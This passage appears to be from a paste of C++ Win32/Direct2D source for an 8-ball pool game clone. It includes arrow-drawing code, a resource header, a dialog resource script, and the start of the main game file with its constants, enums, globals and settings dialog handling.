        else if (IsPlayerOnEightBall(currentPlayer)) {
            // If it's a normal turn but the player is on the 8-ball, show their called pocket as a reminder.
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }*/

        if (pocketToIndicate < 0 || pocketToIndicate > 5) {
            return; // Don't draw if no pocket is selected or relevant.
        }

        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Yellow, 0.9f), &pArrowBrush);
        if (!pArrowBrush) return;

        // ... The rest of your arrow drawing geometry logic remains exactly the same ...
        // (No changes needed to the points/path drawing, only the logic above)
        D2D1_POINT_2F targetPocketCenter = pocketPositions[pocketToIndicate];
        float arrowHeadSize = HOLE_VISUAL_RADIUS * 0.5f;
        float arrowShaftLength = HOLE_VISUAL_RADIUS * 0.3f;
        float arrowShaftWidth = arrowHeadSize * 0.4f;
        float verticalOffsetFromPocketCenter = HOLE_VISUAL_RADIUS * 1.6f;
        D2D1_POINT_2F tip, baseLeft, baseRight, shaftTopLeft, shaftTopRight, shaftBottomLeft, shaftBottomRight;

        if (targetPocketCenter.y == TABLE_TOP) {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y + verticalOffsetFromPocketCenter + arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y - arrowShaftLength);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y - arrowShaftLength);
        }
        else {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y - verticalOffsetFromPocketCenter - arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y + arrowShaftLength);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y + arrowShaftLength);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
        }

        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(baseLeft); pSink->AddLine(shaftBottomLeft); pSink->AddLine(shaftTopLeft);
                pSink->AddLine(shaftTopRight); pSink->AddLine(shaftBottomRight); pSink->AddLine(baseRight);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
        SafeRelease(&pArrowBrush);
    }
```
 
==++ Here's the full source for (file 2/3 (No OOP-based)) ""resource.h""::: ++==
```resource.h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Yahoo-8Ball-Pool-Clone.rc
//
#define IDI_ICON1                       101
// --- NEW Resource IDs (Define these in your .rc file / resource.h) ---
#define IDD_NEWGAMEDLG 106
#define IDC_RADIO_2P   1003
#define IDC_RADIO_CPU  1005
#define IDC_GROUP_AI   1006
#define IDC_RADIO_EASY 1007
#define IDC_RADIO_MEDIUM 1008
#define IDC_RADIO_HARD 1009
// --- NEW Resource IDs for Opening Break ---
#define IDC_GROUP_BREAK_MODE 1010
#define IDC_RADIO_CPU_BREAK  1011
#define IDC_RADIO_P1_BREAK   1012
#define IDC_RADIO_FLIP_BREAK 1013
// Standard IDOK is usually defined, otherwise define it (e.g., #define IDOK 1)
 
// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40002 // Incremented
#define _APS_NEXT_CONTROL_VALUE         1014 // Incremented
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
 
```
 
==++ Here's the full source for (file 3/3 (No OOP-based)) ""Yahoo-8Ball-Pool-Clone.rc""::: ++==
```Yahoo-8Ball-Pool-Clone.rc
// Microsoft Visual C++ generated resource script.
//
#include ""resource.h""
 
#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include ""winres.h""
 
/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS
 
/////////////////////////////////////////////////////////////////////////////
// English (United States) resources
 
#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)
 
#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//
 
1 TEXTINCLUDE 
BEGIN
    ""resource.h\0""
END
 
2 TEXTINCLUDE 
BEGIN
    ""#include """"winres.h""""\r\n""
    ""\0""
END
 
3 TEXTINCLUDE 
BEGIN
    ""\r\n""
    ""\0""
END
 
#endif    // APSTUDIO_INVOKED
 
 
/////////////////////////////////////////////////////////////////////////////
//
// Icon
//
 
// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    ""D:\\Download\\cpp-projekt\\FuzenOp_SiloTest\\icons\\shell32_277.ico""
 
#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////
 
 
 
#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//
 
 
/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED
 
#include <windows.h> // Needed for control styles like WS_GROUP, BS_AUTORADIOBUTTON etc.
 
/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//
 
IDD_NEWGAMEDLG DIALOGEX 0, 0, 220, 185 // Dialog position (x, y) and size (width, height) in Dialog Units (DLUs) - Increased Height
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION ""New 8-Ball Game""
FONT 8, ""MS Shell Dlg"", 400, 0, 0x1 // Standard dialog font
BEGIN
// --- Game Mode Selection ---
// Group Box for Game Mode (Optional visually, but helps structure)
GROUPBOX        ""Game Mode"", IDC_STATIC, 7, 7, 90, 50
 
// ""2 Player"" Radio Button (First in this group)
CONTROL         ""&2 Player (Human vs Human)"", IDC_RADIO_2P, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 14, 20, 80, 10
 
// ""Human vs CPU"" Radio Button
CONTROL         ""Human vs &CPU"", IDC_RADIO_CPU, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 14, 35, 70, 10
 
 
// --- AI Difficulty Selection (Inside its own Group Box) ---
GROUPBOX        ""AI Difficulty"", IDC_GROUP_AI, 118, 7, 95, 70
 
// ""Easy"" Radio Button (First in the AI group)
CONTROL         ""&Easy"", IDC_RADIO_EASY, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 20, 60, 10
 
// ""Medium"" Radio Button
CONTROL         ""&Medium"", IDC_RADIO_MEDIUM, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 35, 60, 10
 
// ""Hard"" Radio Button
CONTROL         ""&Hard"", IDC_RADIO_HARD, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 50, 60, 10
 
// --- Opening Break Modes (For Versus CPU Only) ---
GROUPBOX        ""Opening Break Modes:"", IDC_GROUP_BREAK_MODE, 118, 82, 95, 60
 
// ""CPU Break"" Radio Button (Default for this group)
CONTROL         ""&CPU Break"", IDC_RADIO_CPU_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 95, 70, 10
 
// ""P1 Break"" Radio Button
CONTROL         ""&P1 Break"", IDC_RADIO_P1_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 110, 70, 10
 
// ""FlipCoin Break"" Radio Button
CONTROL         ""&FlipCoin Break"", IDC_RADIO_FLIP_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 125, 70, 10
 
 
// --- Standard Buttons ---
DEFPUSHBUTTON   ""Start"", IDOK, 55, 160, 50, 14 // Default button (Enter key) - Adjusted Y position
PUSHBUTTON      ""Cancel"", IDCANCEL, 115, 160, 50, 14 // Adjusted Y position
END
 
```"
rYzq6vCf,2D StickPool Game C++ (Midnight Pool 4 'BLISS Engine' Before O3 AI Visual Tweaks,alien_fx_fiend,C++,Friday 11th of July 2025 12:33:00 PM CDT,"==++ Here's the full source code of (file 1\3) ""Pool-Game-CloneV18.cpp""::: ++==
```""Pool-Game-CloneV18.cpp""
    #define WIN32_LEAN_AND_MEAN
    #define NOMINMAX
    #include <windows.h>
    #include <d2d1.h>
    #include <dwrite.h>
    #include <fstream> // For file I/O
    #include <iostream> // For some basic I/O, though not strictly necessary for just file ops
    #include <vector>
    #include <cmath>
    #include <string>
    #include <sstream> // Required for wostringstream
    #include <algorithm> // Required for std::max, std::min
    #include <ctime>    // Required for srand, time
    #include <cstdlib> // Required for srand, rand (often included by others, but good practice)
    #include <commctrl.h> // Needed for radio buttons etc. in dialog (if using native controls)
    #include <mmsystem.h> // For PlaySound
    #include <tchar.h> //midi func
    #include <thread>
    #include <atomic>
    #include ""resource.h""

    #ifndef HAS_STD_CLAMP
    template <typename T>
    T clamp(const T& v, const T& lo, const T& hi)
    {
        return (v < lo) ? lo : (v > hi) ? hi : v;
    }
    namespace std { using ::clamp; }   // inject into std:: for seamless use
    #define HAS_STD_CLAMP
    #endif

    #pragma comment(lib, ""Comctl32.lib"") // Link against common controls library
    #pragma comment(lib, ""d2d1.lib"")
    #pragma comment(lib, ""dwrite.lib"")
    #pragma comment(lib, ""Winmm.lib"") // Link against Windows Multimedia library

    // --- Constants ---
    const float PI = 3.1415926535f;
    const float BALL_RADIUS = 10.0f;
    const float TABLE_LEFT = 100.0f;
    const float TABLE_TOP = 100.0f;
    const float TABLE_WIDTH = 700.0f;
    const float TABLE_HEIGHT = 350.0f;
    const float TABLE_RIGHT = TABLE_LEFT + TABLE_WIDTH;
    const float TABLE_BOTTOM = TABLE_TOP + TABLE_HEIGHT;
    const float CUSHION_THICKNESS = 20.0f;
    const float HOLE_VISUAL_RADIUS = 22.0f; // Visual size of the hole
    const float POCKET_RADIUS = HOLE_VISUAL_RADIUS * 1.05f; // Make detection radius slightly larger // Make detection radius match visual size (or slightly larger)
    const float MAX_SHOT_POWER = 15.0f;
    const float FRICTION = 0.985f; // Friction factor per frame
    const float MIN_VELOCITY_SQ = 0.01f * 0.01f; // Stop balls below this squared velocity
    const float HEADSTRING_X = TABLE_LEFT + TABLE_WIDTH * 0.30f; // 30% line
    const float RACK_POS_X = TABLE_LEFT + TABLE_WIDTH * 0.65f; // 65% line for rack apex
    const float RACK_POS_Y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
    const UINT ID_TIMER = 1;
    const int TARGET_FPS = 60; // Target frames per second for timer

    // --- Enums ---
    // --- MODIFIED/NEW Enums ---
    enum GameState {
        SHOWING_DIALOG,     // NEW: Game is waiting for initial dialog input
        PRE_BREAK_PLACEMENT,// Player placing cue ball for break
        BREAKING,           // Player is aiming/shooting the break shot
        CHOOSING_POCKET_P1, // NEW: Player 1 needs to call a pocket for the 8-ball
        CHOOSING_POCKET_P2, // NEW: Player 2 needs to call a pocket for the 8-ball
        AIMING,             // Player is aiming
        AI_THINKING,        // NEW: AI is calculating its move
        SHOT_IN_PROGRESS,   // Balls are moving
        ASSIGNING_BALLS,    // Turn after break where ball types are assigned
        PLAYER1_TURN,
        PLAYER2_TURN,
        BALL_IN_HAND_P1,
        BALL_IN_HAND_P2,
        GAME_OVER
    };

    enum BallType {
        NONE,
        SOLID,  // Yellow (1-7)
        STRIPE, // Red (9-15)
        EIGHT_BALL, // Black (8)
        CUE_BALL // White (0)
    };

    // NEW Enums for Game Mode and AI Difficulty
    enum GameMode {
        HUMAN_VS_HUMAN,
        HUMAN_VS_AI
    };

    enum AIDifficulty {
        EASY,
        MEDIUM,
        HARD
    };

    enum OpeningBreakMode {
        CPU_BREAK,
        P1_BREAK,
        FLIP_COIN_BREAK
    };

    // --- Structs ---
    struct Ball {
        int id;             // 0=Cue, 1-7=Solid, 8=Eight, 9-15=Stripe
        BallType type;
        float x, y;
        float vx, vy;
        D2D1_COLOR_F color;
        bool isPocketed;
    };

    struct PlayerInfo {
        BallType assignedType;
        int ballsPocketedCount;
        std::wstring name;
    };

    // --- Global Variables ---

    // Direct2D & DirectWrite
    ID2D1Factory* pFactory = nullptr;
    //ID2D1Factory* g_pD2DFactory = nullptr;
    ID2D1HwndRenderTarget* pRenderTarget = nullptr;
    IDWriteFactory* pDWriteFactory = nullptr;
    IDWriteTextFormat* pTextFormat = nullptr;
    IDWriteTextFormat* pLargeTextFormat = nullptr; // For ""Foul!""

    // Game State
    HWND hwndMain = nullptr;
    GameState currentGameState = SHOWING_DIALOG; // Start by showing dialog
    std::vector<Ball> balls;
    int currentPlayer = 1; // 1 or 2
    PlayerInfo player1Info = { BallType::NONE, 0, L""Vince Woods""/*""Player 1""*/ };
    PlayerInfo player2Info = { BallType::NONE, 0, L""Virtus Pro""/*""CPU""*/ }; // Default P2 name
    bool foulCommitted = false;
    std::wstring gameOverMessage = L"""";
    bool firstBallPocketedAfterBreak = false;
    std::vector<int> pocketedThisTurn;
    // --- NEW: 8-Ball Pocket Call Globals ---
    int calledPocketP1 = -1; // Pocket index (0-5) called by Player 1 for the 8-ball. -1 means not called.
    int calledPocketP2 = -1; // Pocket index (0-5) called by Player 2 for the 8-ball.
    int currentlyHoveredPocket = -1; // For visual feedback on which pocket is being hovered
    std::wstring pocketCallMessage = L""""; // Message like ""Choose a pocket...""
         // --- NEW: Remember which pocket the 8?ball actually went into last shot
    int lastEightBallPocketIndex = -1;
    //int lastPocketedIndex = -1; // pocket index (0–5) of the last ball pocketed
    int called = -1;
    bool cueBallPocketed = false;

    // --- NEW: Foul Tracking Globals ---
    int firstHitBallIdThisShot = -1;      // ID of the first object ball hit by cue ball (-1 if none)
    bool cueHitObjectBallThisShot = false; // Did cue ball hit an object ball this shot?
    bool railHitAfterContact = false;     // Did any ball hit a rail AFTER cue hit an object ball?
    // --- End New Foul Tracking Globals ---

    // NEW Game Mode/AI Globals
    GameMode gameMode = HUMAN_VS_HUMAN; // Default mode
    AIDifficulty aiDifficulty = MEDIUM; // Default difficulty
    OpeningBreakMode openingBreakMode = CPU_BREAK; // Default opening break mode
    bool isPlayer2AI = false;           // Is Player 2 controlled by AI?
    bool aiTurnPending = false;         // Flag: AI needs to take its turn when possible
    // bool aiIsThinking = false;       // Replaced by AI_THINKING game state
    // NEW: Flag to indicate if the current shot is the opening break of the game
    bool isOpeningBreakShot = false;

    // NEW: For AI shot planning and visualization
    struct AIPlannedShot {
        float angle;
        float power;
        float spinX;
        float spinY;
        bool isValid; // Is there a valid shot planned?
    };
    AIPlannedShot aiPlannedShotDetails; // Stores the AI's next shot
    bool aiIsDisplayingAim = false;    // True when AI has decided a shot and is in ""display aim"" mode
    int aiAimDisplayFramesLeft = 0;  // How many frames left to display AI aim
    const int AI_AIM_DISPLAY_DURATION_FRAMES = 45; // Approx 0.75 seconds at 60 FPS, adjust as needed

    // Input & Aiming
    POINT ptMouse = { 0, 0 };
    bool isAiming = false;
    bool isDraggingCueBall = false;
    // --- ENSURE THIS LINE EXISTS HERE ---
    bool isDraggingStick = false; // True specifically when drag initiated on the stick graphic
    // --- End Ensure ---
    bool isSettingEnglish = false;
    D2D1_POINT_2F aimStartPoint = { 0, 0 };
    float cueAngle = 0.0f;
    float shotPower = 0.0f;
    float cueSpinX = 0.0f; // Range -1 to 1
    float cueSpinY = 0.0f; // Range -1 to 1
    float pocketFlashTimer = 0.0f;
    bool cheatModeEnabled = false; // Cheat Mode toggle (G key)
    int draggingBallId = -1;
    bool keyboardAimingActive = false; // NEW FLAG: true when arrow keys modify aim/power
    MCIDEVICEID midiDeviceID = 0; //midi func
    std::atomic<bool> isMusicPlaying(false); //midi func
    std::thread musicThread; //midi func
    void StartMidi(HWND hwnd, const TCHAR* midiPath);
    void StopMidi();

    // UI Element Positions
    D2D1_RECT_F powerMeterRect = { TABLE_RIGHT + CUSHION_THICKNESS + 10, TABLE_TOP, TABLE_RIGHT + CUSHION_THICKNESS + 40, TABLE_BOTTOM };
    D2D1_RECT_F spinIndicatorRect = { TABLE_LEFT - CUSHION_THICKNESS - 60, TABLE_TOP + 20, TABLE_LEFT - CUSHION_THICKNESS - 20, TABLE_TOP + 60 }; // Circle area
    D2D1_POINT_2F spinIndicatorCenter = { spinIndicatorRect.left + (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f, spinIndicatorRect.top + (spinIndicatorRect.bottom - spinIndicatorRect.top) / 2.0f };
    float spinIndicatorRadius = (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f;
    D2D1_RECT_F pocketedBallsBarRect = { TABLE_LEFT, TABLE_BOTTOM + CUSHION_THICKNESS + 30, TABLE_RIGHT, TABLE_BOTTOM + CUSHION_THICKNESS + 70 };

    // Corrected Pocket Center Positions (aligned with table corners/edges)
    const D2D1_POINT_2F pocketPositions[6] = {
        {TABLE_LEFT, TABLE_TOP},                           // Top-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_TOP},      // Top-Middle
        {TABLE_RIGHT, TABLE_TOP},                          // Top-Right
        {TABLE_LEFT, TABLE_BOTTOM},                        // Bottom-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_BOTTOM},   // Bottom-Middle
        {TABLE_RIGHT, TABLE_BOTTOM}                        // Bottom-Right
    };

    // Colors
    const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.1608f, 0.4000f, 0.1765f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    //const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.0f, 0.5f, 0.1f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF(0.3608f, 0.0275f, 0.0078f)); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    //const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF::Red); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    const D2D1_COLOR_F POCKET_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F CUE_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::White);
    const D2D1_COLOR_F EIGHT_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F SOLID_COLOR = D2D1::ColorF(D2D1::ColorF::Goldenrod); // Solids = Yellow Goldenrod
    const D2D1_COLOR_F STRIPE_COLOR = D2D1::ColorF(D2D1::ColorF::DarkOrchid);   // Stripes = Red DarkOrchid
    const D2D1_COLOR_F AIM_LINE_COLOR = D2D1::ColorF(D2D1::ColorF::White, 0.7f); // Semi-transparent white
    const D2D1_COLOR_F FOUL_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(0.1333f, 0.7294f, 0.7490f); //NEWCOLOR 0.1333f, 0.7294f, 0.7490f => ::Blue
    //const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(D2D1::ColorF::Blue);
    const D2D1_COLOR_F ENGLISH_DOT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F UI_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Black);

    // --- Forward Declarations ---
    HRESULT CreateDeviceResources();
    void DiscardDeviceResources();
    void OnPaint();
    void OnResize(UINT width, UINT height);
    void InitGame();
    void GameUpdate();
    void UpdatePhysics();
    void CheckCollisions();
    bool CheckPockets(); // Returns true if any ball was pocketed
    void ProcessShotResults();
    void ApplyShot(float power, float angle, float spinX, float spinY);
    void RespawnCueBall(bool behindHeadstring);
    bool AreBallsMoving();
    void SwitchTurns();
    //bool AssignPlayerBallTypes(BallType firstPocketedType);
    bool AssignPlayerBallTypes(BallType firstPocketedType,
        bool creditShooter = true);
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed);
    Ball* GetBallById(int id);
    Ball* GetCueBall();
    //void PlayGameMusic(HWND hwnd); //midi func
    void AIBreakShot();

    // Drawing Functions
    void DrawScene(ID2D1RenderTarget* pRT);
    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory);
    void DrawBalls(ID2D1RenderTarget* pRT);
    void DrawCueStick(ID2D1RenderTarget* pRT);
    void DrawAimingAids(ID2D1RenderTarget* pRT);
    void DrawUI(ID2D1RenderTarget* pRT);
    void DrawPowerMeter(ID2D1RenderTarget* pRT);
    void DrawSpinIndicator(ID2D1RenderTarget* pRT);
    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT);
    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT);
    // NEW
    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT);

    // Helper Functions
    float GetDistance(float x1, float y1, float x2, float y2);
    float GetDistanceSq(float x1, float y1, float x2, float y2);
    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring);
    template <typename T> void SafeRelease(T** ppT);
    // --- NEW HELPER FORWARD DECLARATIONS ---
    bool IsPlayerOnEightBall(int player);
    void CheckAndTransitionToPocketChoice(int playerID);
    // --- ADD FORWARD DECLARATION FOR NEW HELPER HERE ---
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b);
    // --- End Forward Declaration ---
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection); // Keep this if present

    // --- NEW Forward Declarations ---

    // AI Related
    struct AIShotInfo; // Define below
    void TriggerAIMove();
    void AIMakeDecision();
    void AIPlaceCueBall();
    AIShotInfo AIFindBestShot();
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex);
    bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2);
    Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq); // Added hitDistSq output
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist);
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex);
    bool IsValidAIAimAngle(float angle); // Basic check

    // Dialog Related
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
    void ShowNewGameDialog(HINSTANCE hInstance);
    void LoadSettings(); // For deserialization
    void SaveSettings(); // For serialization
    const std::wstring SETTINGS_FILE_NAME = L""Pool-Settings.txt"";
    void ResetGame(HINSTANCE hInstance); // Function to handle F2 reset

    // --- Forward Declaration for Window Procedure --- <<< Add this line HERE
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

    // --- NEW Struct for AI Shot Evaluation ---
    struct AIShotInfo {
        bool possible = false;          // Is this shot considered viable?
        Ball* targetBall = nullptr;     // Which ball to hit
        int pocketIndex = -1;           // Which pocket to aim for (0-5)
        D2D1_POINT_2F ghostBallPos = { 0,0 }; // Where cue ball needs to hit target ball
        float angle = 0.0f;             // Calculated shot angle
        float power = 0.0f;             // Calculated shot power
        float score = -1.0f;            // Score for this shot (higher is better)
        bool involves8Ball = false;     // Is the target the 8-ball?
        float spinX = 0.0f;
        float spinY = 0.0f;
    };

    /*
    table = TABLE_COLOR new: #29662d (0.1608, 0.4000, 0.1765) => old: (0.0f, 0.5f, 0.1f)
    rail CUSHION_COLOR = #5c0702 (0.3608, 0.0275, 0.0078) => ::Red
    gap = #e99d33 (0.9157, 0.6157, 0.2000) => ::Orange
    winbg = #5e8863 (0.3686, 0.5333, 0.3882) => 1.0f, 1.0f, 0.803f
    headstring = #47742f (0.2784, 0.4549, 0.1843) => ::White
    bluearrow = #08b0a5 (0.0314, 0.6902, 0.6471) *#22babf (0.1333,0.7294,0.7490) => ::Blue
    */

    // --- NEW Settings Serialization Functions ---
    void SaveSettings() {
        std::ofstream outFile(SETTINGS_FILE_NAME);
        if (outFile.is_open()) {
            outFile << static_cast<int>(gameMode) << std::endl;
            outFile << static_cast<int>(aiDifficulty) << std::endl;
            outFile << static_cast<int>(openingBreakMode) << std::endl;
            outFile.close();
        }
        // else: Handle error, e.g., log or silently fail
    }

    void LoadSettings() {
        std::ifstream inFile(SETTINGS_FILE_NAME);
        if (inFile.is_open()) {
            int gm, aid, obm;
            if (inFile >> gm) {
                gameMode = static_cast<GameMode>(gm);
            }
            if (inFile >> aid) {
                aiDifficulty = static_cast<AIDifficulty>(aid);
            }
            if (inFile >> obm) {
                openingBreakMode = static_cast<OpeningBreakMode>(obm);
            }
            inFile.close();

            // Validate loaded settings (optional, but good practice)
            if (gameMode < HUMAN_VS_HUMAN || gameMode > HUMAN_VS_AI) gameMode = HUMAN_VS_HUMAN; // Default
            if (aiDifficulty < EASY || aiDifficulty > HARD) aiDifficulty = MEDIUM; // Default
            if (openingBreakMode < CPU_BREAK || openingBreakMode > FLIP_COIN_BREAK) openingBreakMode = CPU_BREAK; // Default
        }
        // else: File doesn't exist or couldn't be opened, use defaults (already set in global vars)
    }
    // --- End Settings Serialization Functions ---

    // --- NEW Dialog Procedure ---
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
        switch (message) {
        case WM_INITDIALOG:
        {
            // --- ACTION 4: Center Dialog Box ---
    // Optional: Force centering if default isn't working
            RECT rcDlg, rcOwner, rcScreen;
            HWND hwndOwner = GetParent(hDlg); // GetParent(hDlg) might be better if hwndMain is passed
            if (hwndOwner == NULL) hwndOwner = GetDesktopWindow();

            GetWindowRect(hwndOwner, &rcOwner);
            GetWindowRect(hDlg, &rcDlg);
            CopyRect(&rcScreen, &rcOwner); // Use owner rect as reference bounds

            // Offset the owner rect relative to the screen if it's not the desktop
            if (GetParent(hDlg) != NULL) { // If parented to main window (passed to DialogBoxParam)
                OffsetRect(&rcOwner, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcDlg, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcScreen, -rcScreen.left, -rcScreen.top);
            }


            // Calculate centered position
            int x = rcOwner.left + (rcOwner.right - rcOwner.left - (rcDlg.right - rcDlg.left)) / 2;
            int y = rcOwner.top + (rcOwner.bottom - rcOwner.top - (rcDlg.bottom - rcDlg.top)) / 2;

            // Ensure it stays within screen bounds (optional safety)
            x = std::max(static_cast<int>(rcScreen.left), x);
            y = std::max(static_cast<int>(rcScreen.top), y);
            if (x + (rcDlg.right - rcDlg.left) > rcScreen.right)
                x = rcScreen.right - (rcDlg.right - rcDlg.left);
            if (y + (rcDlg.bottom - rcDlg.top) > rcScreen.bottom)
                y = rcScreen.bottom - (rcDlg.bottom - rcDlg.top);


            // Set the dialog position
            SetWindowPos(hDlg, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);

            // --- End Centering Code ---

            // Set initial state based on current global settings (or defaults)
            CheckRadioButton(hDlg, IDC_RADIO_2P, IDC_RADIO_CPU, (gameMode == HUMAN_VS_HUMAN) ? IDC_RADIO_2P : IDC_RADIO_CPU);

            CheckRadioButton(hDlg, IDC_RADIO_EASY, IDC_RADIO_HARD,
                (aiDifficulty == EASY) ? IDC_RADIO_EASY : ((aiDifficulty == MEDIUM) ? IDC_RADIO_MEDIUM : IDC_RADIO_HARD));

            // Enable/Disable AI group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), gameMode == HUMAN_VS_AI);
            // Set initial state for Opening Break Mode
            CheckRadioButton(hDlg, IDC_RADIO_CPU_BREAK, IDC_RADIO_FLIP_BREAK,
                (openingBreakMode == CPU_BREAK) ? IDC_RADIO_CPU_BREAK : ((openingBreakMode == P1_BREAK) ? IDC_RADIO_P1_BREAK : IDC_RADIO_FLIP_BREAK));
            // Enable/Disable Opening Break group based on initial mode
